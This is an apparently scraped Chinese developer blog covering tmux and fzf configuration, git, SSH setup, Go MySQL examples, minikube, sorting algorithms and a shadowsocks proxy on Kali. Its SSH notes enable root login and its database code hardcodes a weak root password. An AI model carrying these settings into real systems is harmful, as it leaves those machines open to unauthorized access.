.tmux.conf 中： setw -g mode-keys vi 启用这条配置后，就可以使用 h、j、k、l 来移动光标了。 想要退出文本复制模式的话，按下回车键就可以了。然后按下 PREFIX-] 粘贴刚才复制的文本。 一次移动一格效率低下，在 Vi 模式启用的情况下，可以辅助一些别的快捷键高效工作。 例如，可以使用 w 键逐词移动，使用 b 键逐词回退。使用 f 键加上任意字符跳转到当前行第一次出现该字符的位置，使用 F 键达到相反的效果。 vi emacs 功能 ^ M-m 反缩进 Escape C-g 清除选定内容 Enter M-w 复制选定内容 j Down 光标下移 h Left 光标左移 l Right 光标右移 L 光标移到尾行 M M-r 光标移到中间行 H M-R 光标移到首行 k Up 光标上移 d C-u 删除整行 D C-k 删除到行末 $ C-e 移到行尾 : g 前往指定行 C-d M-Down 向下滚动半屏 C-u M-Up 向上滚动半屏 C-f Page down 下一页 w M-f 下一个词 p C-y 粘贴 C-b Page up 上一页 b M-b 上一个词 q Escape 退出 C-Down or J C-Down 向下翻 C-Up or K C-Up 向下翻 n n 继续搜索 ? C-r 向前搜索 / C-s 向后搜索 0 C-a 移到行首 Space C-Space 开始选中 C-t 字符调序 杂项： d 退出 tmux（tmux 仍在后台运行） t 窗口中央显示一个数字时钟 ? 列出所有快捷键 : 命令提示符 配置选项： # 鼠标支持 - 设置为 on 来启用鼠标(与 2.1 之前的版本有区别，请自行查阅 man page) * set -g mouse on # 设置默认终端模式为 256color set -g default-terminal &quot;screen-256color&quot; # 启用活动警告 setw -g monitor-activity on set -g visual-activity on # 居中窗口列表 set -g status-justify centre # 最大化/恢复窗格 unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp 参考配置文件（~/.tmux.conf）： 下面这份配置是我使用 Tmux 几年来逐渐精简后的配置，请自取。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -----------------------------------------------------------------------------# Tmux 基本配置 - 要求 Tmux &gt;= 2.3# 如果不想使用插件，只需要将此节的内容写入 ~/.tmux.conf 即可# -----------------------------------------------------------------------------# C-b 和 VIM 冲突，修改 Prefix 组合键为 Control-Z，按键距离近set -g prefix C-zset -g base-index 1 # 窗口编号从 1 开始计数set -g display-panes-time 10000 # PREFIX-Q 显示编号的驻留时长，单位 msset -g mouse on # 开启鼠标set -g pane-base-index 1 # 窗格编号从 1 开始计数set -g renumber-windows on # 关掉某个窗口后，编号重排setw -g allow-rename off # 禁止活动进程修改窗口名setw -g automatic-rename off # 禁止自动命名新窗口setw -g mode-keys vi # 进入复制模式的时候使用 vi 键位（默认是 EMACS）# -----------------------------------------------------------------------------# 使用插件 - via tpm# 1. 执行 git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm# 2. 执行 bash ~/.tmux/plugins/tpm/bin/install_plugins# -----------------------------------------------------------------------------setenv -g TMUX_PLUGIN_MANAGER_PATH '~/.tmux/plugins'# 推荐的插件（请去每个插件的仓库下读一读使用教程）set -g @plugin 'seebi/tmux-colors-solarized'set -g @plugin 'tmux-plugins/tmux-pain-control'set -g @plugin 'tmux-plugins/tmux-prefix-highlight'set -g @plugin 'tmux-plugins/tmux-resurrect'set -g @plugin 'tmux-plugins/tmux-sensible'set -g @plugin 'tmux-plugins/tmux-yank'set -g @plugin 'tmux-plugins/tpm'# tmux-resurrectset -g @resurrect-dir '~/.tmux/resurrect'# tmux-prefix-highlightset -g status-right '#&#123;prefix_highlight&#125; #H | %a %Y-%m-%d %H:%M'set -g @prefix_highlight_show_copy_mode 'on'set -g @prefix_highlight_copy_mode_attr 'fg=white,bg=blue'# 初始化 TPM 插件管理器 (放在配置文件的最后)run '~/.tmux/plugins/tpm/tpm'# -----------------------------------------------------------------------------# 结束# ----------------------------------------------------------------------------- fzf 官方文档给的基本操作是 cd**+Tab生成列表+Enter生成命令+Enter执行 快捷键可以把4步变成两步 还是很Nice ctrl+R ctrl+T 特别介绍一下Preview 功能 我们知道在Unix环境下 我们要看文件的时候 必须一个个打开 当文件数量较大的场景 比如说 我们调了10个参数 做了20组实验 每组实验拿到30轮结果 这时候 一个个vim开 怕不是要吐了 这时候你是不是开始怀念有GUI的世界 当然 你可以写个bash脚本 把所有的文件合到一个文件 然后 只看一个file就行了 fzf给出了另外一个炫酷的解决方案 set alias 1234$ vim ~/.zshrcalias pp=&apos;fzf --preview &apos;&quot;&apos;&quot;&apos;[[ $(file --mime &#123;&#125;) =~ binary ]] &amp;&amp; echo &#123;&#125; is a binary file || (highlight -O ansi -l &#123;&#125; || coderay &#123;&#125; || rougify &#123;&#125; || cat &#123;&#125;) 2&gt; /dev/null | head -500&apos;&quot;&apos;&quot;alias oo=&apos;fzf --preview &apos;&quot;&apos;&quot;&apos;[[ $(file --mime &#123;&#125;) =~ binary ]] &amp;&amp; echo &#123;&#125; is a binary file || (highlight -O ansi -l &#123;&#125; || coderay &#123;&#125; || rougify &#123;&#125; || tac &#123;&#125;) 2&gt; /dev/null | head -500&apos;&quot;&apos;&quot; # flashback$ source ~/.zshrc ITerm2 可定制化Hotkey, 一键召出iTerm2 (不再需要⌘+Tab 或者 通过spotlight切换) 快捷的组合键 ⌘+Shift+E 召唤时间线 ⌘+Option+b 时光机 ⌘+T 新Tab ⌘+D 水平分屏 ⌘+← 切换Tab / ⌘+shift+← 切换分屏 关闭panel：⌘ + w 最大化Tab中的pane，隐藏本Tab中的其他pane：⌘+ shift +enter , 再次还原 按下 Command + T 可以新建一个 Tab，每个标签页的后面都会标记一个序号，通过 Command + 序号 就可以在多个页面之间切换了，或者用 Command + [ 和 Command + ] 来切换到左侧或者右侧的标签页。 同一个 Tab 内，还可以切分出多个 Pane，有两种切分方式： Command + D：水平切分，切分出一左一右两个 Pane Command + Shift + D：垂直切分，切分出一上一下两个 Pane 通过 Command + Ctrl + 方向键 可以调整每个 Pane 的大小，通过 Command + Option + 方向键 可以切换 Pane。 MAC系统快捷键进阶 除了 Command + C/V 这种入门必备的快捷键，还有一些系统级的常用快捷键是有必要掌握一下的。 光标移动 这里比较推荐使用 Emacs 系的快捷键而不是传统的 Command + ←/→/Delete之类的。因为后者并不通用，比如在终端中就无法使用，而 Emacs 系的快捷键则在几乎所有系统级别的输入框内都通用。 常见的几个行级别操作有： Ctrl + A：移动到行首 Ctrl + E：移动到行尾 Ctrl + K：删除到行尾 Ctrl + N：移动到下一行 Ctrl + P：移动到上一行 前三个命令在终端中非常常用，能大幅度提高工作效率。后两个命令则在 Vim 系列中很常见，多用于上下切换列表中的选项。 几个比较常见的字母级别操作有： Ctrl + F：向右（Forward）移动一个字母，等价于方向键 → Ctrl + B：向左（Backward）移动一个字母，等价于方向键 ← Ctrl + D：向右删除一个字母，等价于 → + Delete这个快捷键也很常用 Ctrl + H：向左删除一个字母，等价于 Delete 使用 Option 键 如果觉得按字母操作太过于细粒度，按行操作又太粗粒度，那么 Option 键绝对算得上神器，因为它可以按单词操作。 Option + ←：光标向左移动一个单词 Option + →：光标向右移动一个单词 Option + Delete：删除一个单词 使用 Shift 键 Shift 键类似于可视模式，比如在某个位置点击光标并按住 shift 键不松开，再去另一个位置点击一次，就可以选中两次点击位置之间的文本内容。 注意，shift 键可视模式还可以和 Option 键一起合用，感兴趣的读者可以自行尝试。 max连接 visulBOX中的Ubuntu 使用ssh服务器 在ubuntu中使用桥接模式 步骤 命令 说明 步骤1 sudo su 切换至root用户，ubuntu缺省下root用户有所限制，使用sudo su可以使用当前管理用户的密码切换至root用户，也可以在需要安装权限的命令前加sudo 步骤2 apt install openssh-server 安装openssh-server 步骤3 ssh -V 确认openssh-server版本 步骤4 /etc/init.d/ssh status 确认openssh-server状态 步骤5 /etc/init.d/ssh restart 重新启动 openssh-server vim /etc/ssh/sshd.config permisionRootLogin YES 修改unixpassword ifconfig获取ip 从终端使用ssh命令连接确认ssh -p 22 userkunyu@119.29.37.63 输入密码： virsualBox共享文件夹 共享文件夹为：go文件 sudo su 挂载：mount -t vboxsf go /mnt 软连接：ln -s /mnt/go /home/jackson/go","categories":[{"name":"开发配置","slug":"开发配置","permalink":"https://dreamerjonson.com/categories/开发配置/"}],"tags":[{"name":"开发配置","slug":"开发配置","permalink":"https://dreamerjonson.com/tags/开发配置/"}]},{"title":"git操作github-gitlab","slug":"connect-github-gitlab","date":"2019-04-02T07:43:32.000Z","updated":"2019-05-07T10:55:32.272Z","comments":true,"path":"2019/04/02/connect-github-gitlab/","link":"","permalink":"https://dreamerjonson.com/2019/04/02/connect-github-gitlab/","excerpt":"","text":"克隆 有两种方式，一种是通过ssh,一种是通过http 使用ssh的方式需要在本机生成ssh文件， 参考资料：https://gitlab.followme.com/help/ssh/README#generating-a-new-ssh-key-pair 产生SSH To create a new SSH key pair: Open a terminal on Linux or macOS, or Git Bash / WSL on Windows. 12345Generate a new ED25519 SSH key pair:ssh-keygen -t ed25519 -C &quot;email@example.com&quot;Or, if you want to use RSA:ssh-keygen -o -t rsa -b 4096 -C &quot;email@example.com&quot; Adding an SSH key to your GitLab account Copy your public SSH key to the clipboard by using one of the commands below depending on your Operating System: 12345678macOS:pbcopy &lt; ~/.ssh/id_ed25519.pubWSL / GNU/Linux (requires the xclip package):xclip -sel clip &lt; ~/.ssh/id_ed25519.pubGit Bash on Windows:cat ~/.ssh/id_ed25519.pub | clip go mod 中下载依赖包时，可以使用 go build . 但是下载有时候会出现问题，例如： 我运行go mod download 提示 fatal: could not read Username for ‘https://gitlab.XXX.com’: terminal prompts disabled 这时，需要通过ssh的方式下载gitlab中的数据： 1vim ~/.gitconfig 添加： 12[url &quot;ssh://git@gitlab.XXX.com/&quot;] insteadOf = https://gitlab.XXX.com/ 查看分支 1git branch -a 将远程分支 dev 到本地dev 并切换到dev分支 123git fetch origin dev 存疑git checkout -b dev origin/dev 123git push origin devgit push -f origin dev 强制更新 删除文件 1git rm --cached -r .idea 添加远程 12345git remote add camel-snipet git@gitlab.followme.com:camel/go-snipet.git git remote -v git push camel-snipet dev 回退 12git refloggit reset --hard a7e1d279 mac添加环境变量 1234567操作步骤:1、打开Terminal（终端）2、输入：vim ~/.bash_profile3、设置PATH：export PATH=/usr/local/mysql/bin:$PATH4、输入：:wq //保存并退出vi5、修改立即生效：source ~/.bash_profile6、查看环境变量的值：echo $PATH go run main.go --registry=consul --registry_address=“127.0.0.1:8500” consul： 自动将服务添加到consul UI ：http://localhost:8500 ##gitlab Runner To install GitLab Runner using Homebrew: Install the GitLab Runner. brew install gitlab-runner Install the Runner as a service and start it. brew services start gitlab-runner Runner is installed and running. gitlab-runner register gitlab-runner stop gitlab-runner register gitlab-runner unregister --all-runners ./gitlab-runner run 当远程分支有冲突，强制 git fetch --all git reset --hard origin/master merge git merge -Xtheirs pb 工作区回到最后一次提交的状态。 git checkout . git log --pretty=oneline 但最有意思的是 format，可以定制要显示的记录格式，这样的输出便于后期编程提取分析，像这样： $ git log --pretty=format:&quot;%h - %an, %ar : %s&quot; ca82a6d - Scott Chacon, 11 months ago : changed the version number 085bb3b - Scott Chacon, 11 months ago : removed unnecessary test code a11bef0 - Scott Chacon, 11 months ago : first commit makefile 代码片段 1234567891011121314151617181920proto: for d in api srv; do \\ for f in $$d/**/proto/*.proto; do \\ protoc --proto_path=$&#123;GOPATH&#125;/src --micro_out=. --go_out=. $$f; \\ echo compiled: $$f; \\ done \\ donelint: ./bin/lint.shbuild: ./bin/build.shdata: go-bindata -o data/bindata.go -pkg data data/*.jsonrun: docker-compose build docker-compose up","categories":[{"name":"git","slug":"git","permalink":"https://dreamerjonson.com/categories/git/"},{"name":"mac环境配置","slug":"git/mac环境配置","permalink":"https://dreamerjonson.com/categories/git/mac环境配置/"}],"tags":[{"name":"git","slug":"git","permalink":"https://dreamerjonson.com/tags/git/"},{"name":"mac环境配置","slug":"mac环境配置","permalink":"https://dreamerjonson.com/tags/mac环境配置/"}]},{"title":"golang[71]-golang操作mysql数据库","slug":"golang-71-sql","date":"2019-04-01T09:38:37.000Z","updated":"2019-04-28T02:47:05.425Z","comments":true,"path":"2019/04/01/golang-71-sql/","link":"","permalink":"https://dreamerjonson.com/2019/04/01/golang-71-sql/","excerpt":"","text":"安装 https://dev.mysql.com/downloads Installing MySQL on macOS 推荐使用dmg文件安装 https://dev.mysql.com/doc/refman/5.7/en/osx-installation.html 安装完毕有默认密码 连接 PATH=&quot;$PATH&quot;:/usr/local/mysql/bin sudo su mysql -u root -p 123456 create database test; use test; create table user_info(id int(11),username varchar(20),create_time timestamp ,primary key(id)); INSERT INTO user_info(id,username) VALUES(5,“jonson”); select * from user_info; create table user_info(id int(11),username varchar(20),create_time timestamp ,primary key(id)); 插入 123456789101112131415161718192021package mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\")func main() &#123; db, err := sql.Open(\"mysql\", \"root:123456@tcp(127.0.0.1:3306)/test?charset=utf8\") if err != nil &#123; panic(err) &#125; stmt, err := db.Prepare(`INSERT user_info (id,username) values (?,?)`) res, err := stmt.Exec(88,\"olaya\") id, err := res.LastInsertId() fmt.Println(id)&#125; 删除 12345678910111213141516171819202122232425package mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\")func main() &#123; db, err := sql.Open(\"mysql\", \"root:123456@tcp(127.0.0.1:3306)/test?charset=utf8\") if err != nil &#123; panic(err) &#125; stmt, err := db.Prepare(\"delete from user_info where id=?\") res, err := stmt.Exec(88) id, err := res.RowsAffected() if err != nil &#123; panic(err) &#125; fmt.Println(id)&#125; 更新 1234567891011121314151617181920212223242526// mysql.gopackage mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\")func main() &#123; db, err := sql.Open(\"mysql\", \"root:123456@tcp(127.0.0.1:3306)/test?charset=utf8\") if err != nil &#123; panic(err) &#125; stmt, err := db.Prepare(\"update user_info set id=? where id=?\") res, err := stmt.Exec(5, 99) id, err := res.RowsAffected() if err != nil &#123; panic(err) &#125; fmt.Println(id)&#125; 查询 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// mysql.gopackage mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\")func main() &#123; db, err := sql.Open(\"mysql\", \"root:123456@tcp(127.0.0.1:3306)/test?charset=utf8\") if err != nil &#123; panic(err) &#125; rows, err := db.Query(\"SELECT * FROM user_info\") if err != nil &#123; panic(err) &#125; for rows.Next() &#123; var id int var username string var create_time string err = rows.Scan(&amp;id, &amp;username, &amp;create_time) if err != nil &#123; panic(err) &#125; fmt.Println(id, username, create_time) &#125; //for rows.Next() &#123; // var userId int // var userName string // var userAge int // var userSex int // rows.Columns() // err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) // checkErr(err) // fmt.Println(userId) // fmt.Println(userName) // fmt.Println(userAge) // fmt.Println(userSex) //&#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"k8s","slug":"k8s","date":"2019-03-14T03:29:49.000Z","updated":"2019-03-18T13:29:32.931Z","comments":true,"path":"2019/03/14/k8s/","link":"","permalink":"https://dreamerjonson.com/2019/03/14/k8s/","excerpt":"","text":"mac平台 安装brew 。。。 安装 1brew install kubectl 1brew cask install minikube 12$ which minikube$ minikube start 错误提示 1stderr: failed to pull image &quot;k8s.gcr.io/kube-apiserver:v1.13.4&quot;: output: Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) 打印日志 1minikube logs 使用代理： 12$ minikube delete$ minikube start --docker-env HTTP_PROXY=http://10.0.2.2:1087 --docker-env HTTPS_PROXY=http://10.0.2.2:1087 代理参考资料 https://github.com/kubernetes/minikube/blob/master/docs/http_proxy.md https://my.oschina.net/csq/blog/3014879 配置pod client-pod.yaml 123456789101112apiVersion: v1kind: Podmetadata: name: client-pod labels: component: webspec: containers: - name: client image: stephengrider/multi-worker ports: - containerPort: 3000 配置server 123456789101112apiVersion: v1kind: Servicemetadata: name: client-node-portspec: type: NodePort ports: - port: 3050 targetPort: 3000 nodePort: 31515 selector: component: web 1234$ kubectl apply -f client-pod.yaml$ kubectl apply -f client-node-port.yaml$ kubectl get pods$ kubectl get services 修改client-pod.yaml中的images,重新执行配置文件即可更新 1$ kubectl apply -f client-pod.yaml 获取ip 1$ minikube ip 获取pod详细描述 1$ kubectl describe pod client-pod 删除pod 1$ kubectl delete -f client-pod.yaml 书写deployment 12345678910111213141516171819202122apiVersion: apps/v1kind: Deploymentmetadata: name: client-deploymentspec: replicas: 1 selector: matchLabels: component: web template: metadata: labels: component: web spec: containers: - name: client image: stephengrider/multi-client ports: - containerPort: 3000``` ## 应用deployment $ kubectl apply -f client-deployment.yaml $ kubectl get pods $ kubectl get deployments NAME DESIRED CURRENT UP-TO-DATE AVAILABLE AGE client-deployment 1 1 1 1 30s 12如果image有更新，可以采取下面的方式强制更新： docker build -t stephengrider/multi-client:v5 . docker push stephengrider/multi-client:v5 $ kubectl set image deployment/client-deployment client=stephengrider/multi-client:v5 ## docker ps 得到k8s虚拟机的信息","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[15]-归并排序","slug":"go-struture-15-merge-sort","date":"2019-03-11T14:01:51.000Z","updated":"2019-03-11T14:19:02.441Z","comments":true,"path":"2019/03/11/go-struture-15-merge-sort/","link":"","permalink":"https://dreamerjonson.com/2019/03/11/go-struture-15-merge-sort/","excerpt":"","text":"pre,code { font-family: \"Source Code Pro\", Consolas, Monaco, Menlo, Consolas, monospace !important; } 归并排序（Merge Sort，台湾译作：合并排序）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。 归并操作(Merge)，也叫归并算法，指的是将两个已经排序的序列合并成一个序列的操作。归并排序算法依赖归并操作。归并排序有多路归并排序、两路归并排序 , 可用于内排序，也可以用于外排序。这里仅对内排序的两路归并方法进行讨论。 算法思路： 1、把 n 个记录看成 n 个长度为 l 的有序子表 2、进行两两归并使记录关键字有序，得到 n/2 个长度为 2 的有序子表 3、重复第 2 步直到所有记录归并成一个长度为 n 的有序表为止。 实例分析 以数组 array = [6, 5, 3, 1, 8, 7, 2, 4] 为例，首先将数组分为长度为 2 的子数组，并使每个子数组有序： 123[6, 5] [3, 1] [8, 7] [2, 4] ↓ ↓ ↓ ↓[5, 6] [1, 3] [7, 8] [2, 4] 然后再两两合并： 123[6, 5, 3, 1] [8, 7, 2, 4] ↓ ↓[1, 3, 5, 6] [2, 4, 7, 8] 最后将两个子数组合并： 123[6, 5, 3, 1, 8, 7, 2, 4] ↓[1, 2, 3, 4, 5, 6, 7, 8] 排序过程动画演示如下：","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[14]-希尔排序","slug":"go-struture-14-shell-sort","date":"2019-03-11T10:25:53.000Z","updated":"2019-03-11T14:19:14.462Z","comments":true,"path":"2019/03/11/go-struture-14-shell-sort/","link":"","permalink":"https://dreamerjonson.com/2019/03/11/go-struture-14-shell-sort/","excerpt":"","text":"希尔排序 希尔排序算法是按其设计者希尔（Donald Shell）的名字命名，该算法由1959年公布，是插入排序的一种更高效的改进版本。它的作法不是每次一个元素挨一个元素的比较。而是初期选用大跨步（增量较大）间隔比较，使记录跳跃式接近它的排序位置；然后增量缩小；最后增量为 1 ，这样记录移动次数大大减少，提高了排序效率。希尔排序对增量序列的选择没有严格规定。 希尔排序是基于插入排序的以下两点性质而提出改进方法的： 1、插入排序在对几乎已经排好序的数据操作时， 效率高， 即可以达到线性排序的效率 2、但插入排序一般来说是低效的， 因为插入排序每次只能将数据移动一位 算法思路： 先取一个正整数 d1(d1 &lt; n)，把全部记录分成 d1 个组，所有距离为 d1 的倍数的记录看成一组，然后在各组内进行插入排序 然后取 d2(d2 &lt; d1) 重复上述分组和排序操作；直到取 di = 1(i &gt;= 1) 位置，即所有记录成为一个组，最后对这个组进行插入排序。一般选 d1 约为 n/2，d2 为 d1 /2， d3 为 d2/2 ，…， di = 1。 实例分析 go语言实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println()&#125;func main()&#123; //arr:= []int&#123;8, 5, 2, 6, 9, 3, 1, 4, 0, 7,6,3,10&#125; arr:=[]int&#123;1,3,2,4,9,2,6,5,4,8&#125; print(arr) shellsort(arr) print(arr)&#125;//希尔排序func shellsort(arr []int)&#123; gap:=4 length:= len(arr) for gap &gt;0&#123; for i:=gap;i&lt;length;i+=1&#123; j:= i temp:= arr[i] for;j&gt;0;j-=gap&#123; if j-gap&gt;=0 &amp;&amp; arr[j] &lt; arr[j-gap]&#123; tmp:= arr[j] arr[j] = arr[j-gap] arr[j-gap] = tmp &#125;else&#123; break &#125; &#125; &#125; gap = gap/2 &#125;&#125; javascript实现 123456789101112131415161718192021222324252627function shellSort(array) &#123; function swap(array, i, k) &#123; var temp = array[i]; array[i] = array[k]; array[k] = temp; &#125; var length = array.length, gap = Math.floor(length / 2); while (gap &gt; 0) &#123; for (var i = gap; i &lt; length; i++) &#123; for (var j = i; 0 &lt; j; j -= gap) &#123; if (array[j - gap] &gt; array[j]) &#123; swap(array, j - gap, j); &#125; else &#123; break; &#125; &#125; &#125; gap = Math.floor(gap / 2); &#125; return array;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[13]-二分插入排序","slug":"go-struture-13-binary-sort","date":"2019-03-11T10:14:01.000Z","updated":"2019-03-18T13:30:01.616Z","comments":true,"path":"2019/03/11/go-struture-13-binary-sort/","link":"","permalink":"https://dreamerjonson.com/2019/03/11/go-struture-13-binary-sort/","excerpt":"","text":"二分插入排序 go实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println()&#125;func main()&#123; arr:= []int&#123;2, 6, 9, 3, 1, 4, 0, 7,2, 6, 9, 3, 1,8, 5, 8, 5, 2, 6, 9, 3, 1, 4, 0, 7,2, 6, 9, 3, 1, 4, 0, 7,8, 5, 2, 6, 9, 3, 1, 4, 0, 7&#125; //arr:=[]int&#123;1,3,2,4,9,2,6,5,4,8&#125; print(arr) binarysort(arr) print(arr)&#125;// 插入排序func binarysort(arr []int)&#123; //print(arr) length := len(arr) for i:= 1;i&lt;length;i++&#123; tmp:= arr[i] j:= i-1 if arr[j] &gt; arr[i]&#123; index:= binarysearch(arr,0,i-1,arr[i]) for k:= i-1;k&gt;=index;k--&#123; arr[k+1] =arr[k] &#125; arr[index] = tmp &#125; &#125;&#125;func binarysearch(arr []int, low int, high int, data int) int&#123; for low &lt;=high&#123; mid:= low + (high-low)/2 if data &gt; arr[mid]&#123; if mid+1&lt; len(arr) &amp;&amp; data &lt;=arr[mid+1]&#123; return mid+1 &#125;else&#123; low = mid + 1 &#125; &#125;else&#123; if mid == 0&#123; return 0 &#125;else&#123; high = mid - 1 &#125; &#125; &#125; return 0&#125; JavaScript实现 123456789101112131415161718192021222324252627282930313233343536373839404142function insertionSort2(array) &#123; function binarySearch(array, start, end, temp) &#123; var middle; while (start &lt;= end) &#123; middle = Math.floor((start + end) / 2); if (array[middle] &lt; temp) &#123; if (temp &lt;= array[middle + 1]) &#123; return middle + 1; &#125; else &#123; start = middle + 1; &#125; &#125; else &#123; if (end === 0) &#123; return 0; &#125; else &#123; end = middle; &#125; &#125; &#125; &#125; function binarySort(array) &#123; var length = array.length, i, j, k, temp; for (i = 1; i &lt; length; i++) &#123; temp = array[i]; if (array[i - 1] &lt;= temp) &#123; k = i; &#125; else &#123; k = binarySearch(array, 0, i - 1, temp); for (j = i; j &gt; k; j--) &#123; array[j] = array[j - 1]; &#125; &#125; array[k] = temp; &#125; return array; &#125; return binarySort(array);&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"kali-科学—上网","slug":"kali-shadow","date":"2019-03-10T13:19:38.000Z","updated":"2019-03-10T13:32:02.118Z","comments":true,"path":"2019/03/10/kali-shadow/","link":"","permalink":"https://dreamerjonson.com/2019/03/10/kali-shadow/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940root@kali:# sudo rm /var/lib/dpkg/lock-frontendroot@kali:# sudo apt-get install shadowsocks -yroot@kali:/etc# sudo apt-get install privoxyroot@kali:~# vim /etc/privoxy/config配置Privoxy, 打开 /etc/privoxy/config,注释掉listen-address localhost:8118#listen-address localhost:8118在最后一行后边加上forward-socks5 / 127.0.0.1:1080 .listen-address 127.0.0.1:8118root@kali:/etc# cd shadowsocks/root@kali:/etc/shadowsocks# cp local.json US.json配置ss服务器地址、服务器端口、密码、ss监听端口root@kali:/etc/shadowsocks# vim US.json&#123;&quot;server&quot;:&quot;&quot;,&quot;server_port&quot;:,&quot;local_address&quot;: &quot;127.0.0.1&quot;,&quot;local_port&quot;:9050, &quot;password&quot;:&quot;&quot;,&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;: false,&quot;workers&quot;: 1,&quot;prefer_ipv6&quot;: false&#125;开启root@kali:/etc/shadowsocks# systemctl start privoxy.serviceroot@kali:/etc/shadowsocks# sslocal -c US.json 设置系统代理 socket与配置&quot;local_port&quot;:9050,相同","categories":[{"name":"kali","slug":"kali","permalink":"https://dreamerjonson.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://dreamerjonson.com/tags/kali/"}]},{"title":"go-数据结构[12]-二分查找","slug":"go-struture-12-binary-search","date":"2019-03-10T10:30:27.000Z","updated":"2019-03-11T10:28:17.806Z","comments":true,"path":"2019/03/10/go-struture-12-binary-search/","link":"","permalink":"https://dreamerjonson.com/2019/03/10/go-struture-12-binary-search/","excerpt":"","text":"go语言实现二分查找 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package mainimport \"fmt\"func main() &#123; arr:= []int&#123;1,3,4,6,7,8,10,13,14&#125; for index,data:= range arr&#123; i:= binarySearch(arr,data) fmt.Printf(\"实际序号：%d,找到序号为：%d\\n\",index,i) &#125; fmt.Println(\"-------------------------\") for index,data:= range arr&#123; i:= binarySearch2(arr,0,len(arr)-1,data) fmt.Printf(\"实际序号：%d,找到序号为：%d\\n\",index,i) &#125;&#125;func binarySearch( arr []int, data int ) int&#123; low:= 0 high:= len(arr) - 1 for low &lt;= high&#123; mid:= low + (high-low)/2 if data &gt; arr[mid]&#123; low= mid+1 &#125;else if data &lt; arr[mid]&#123; high= mid - 1 &#125;else&#123; return mid &#125; &#125; return -1&#125;func binarySearch2( arr []int,low,high, data int ) int&#123; ret:= -1 if low &lt;= high&#123; mid := low + (high-low)/2 if data &gt; arr[mid]&#123; ret = binarySearch2(arr,mid+1,high,data) &#125;else if data &lt; arr[mid]&#123; ret = binarySearch2(arr,low,mid-1,data) &#125;else&#123; return mid &#125; &#125; return ret&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[11]-直接插入排序","slug":"go-struture-11-Insertion-Sort","date":"2019-03-10T06:04:58.000Z","updated":"2019-03-10T09:48:53.868Z","comments":true,"path":"2019/03/10/go-struture-11-Insertion-Sort/","link":"","permalink":"https://dreamerjonson.com/2019/03/10/go-struture-11-Insertion-Sort/","excerpt":"","text":"pre,code { font-family: \"Source Code Pro\", Consolas, Monaco, Menlo, Consolas, monospace !important; } 具体算法描述 设有一组关键字｛K1， K2，…， Kn｝；排序开始就认为 K1 是一个有序序列；让 K2 插入上述表长为 1 的有序序列，使之成为一个表长为 2 的有序序列；然后让 K3 插入上述表长为 2 的有序序列，使之成为一个表长为 3 的有序序列；依次类推，最后让 Kn 插入上述表长为 n-1 的有序序列，得一个表长为 n 的有序序列。 具体算法描述如下： 从第一个元素开始，该元素可以认为已经被排序 取出下一个元素，在已经排序的元素序列中从后向前扫描 如果该元素（已排序）大于新元素，将该元素移到下一位置 重复步骤 3，直到找到已排序的元素小于或者等于新元素的位置 将新元素插入到该位置后 重复步骤 2~5 如果比较操作的代价比交换操作大的话，可以采用二分查找法来减少比较操作的数目。该算法可以认为是插入排序的一个变种，称为二分查找排序。 二分查找法，是一种在有序数组中查找某一特定元素的搜索算法。搜素过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜素过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。 实例分析 现有一组数组 arr = [5, 6, 3, 1, 8, 7, 2, 4]，共有八个记录，排序过程如下： 1234567891011121314151617181920212223[5] 6 3 1 8 7 2 4 ↑ │ └───┘[5, 6] 3 1 8 7 2 4↑ │└────────┘[3, 5, 6] 1 8 7 2 4↑ │└──────────┘[1, 3, 5, 6] 8 7 2 4 ↑ │ └──┘[1, 3, 5, 6, 8] 7 2 4 ↑ │ └────┘[1, 3, 5, 6, 